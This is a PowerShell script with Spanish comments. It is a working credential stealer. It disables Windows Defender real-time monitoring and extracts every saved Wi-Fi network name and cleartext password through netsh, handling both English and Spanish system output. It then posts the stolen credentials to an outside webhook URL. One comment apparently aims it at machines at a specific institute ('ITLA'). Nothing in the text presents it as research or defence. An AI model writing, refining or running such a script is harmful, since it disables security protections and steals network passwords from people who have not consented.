# 1. Desactivar Antivirus (Tu comando original con bypass de error)
Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue

# 2. Extraer redes (Optimizado para no captar basura)
$profiles = netsh wlan show prof | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | Where-Object { $_ -notmatch "Perfil|Profile" }

$wifiData = foreach ($n in $profiles) {
    # Buscamos la clave tanto en Inglés como en Español para asegurar el éxito en el ITLA
    $res = netsh wlan show prof name="$n" key=clear
    $k = $res | Select-String "(Key Content|Contenido de la clave)\W+:(.+)$" | ForEach-Object { $_.Matches.Groups[2].Value.Trim() }
    
    if ($k) { "SSID: $n | Pass: $k" }
}

# 3. Convertir a string y enviar al Webhook
$data = $wifiData | Out-String

if ($data.Trim()) {
    # Usamos Invoke-RestMethod con tu URL específica
    Invoke-RestMethod -Uri "https://webhooksite.net/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $data -UseBasicParsing
}
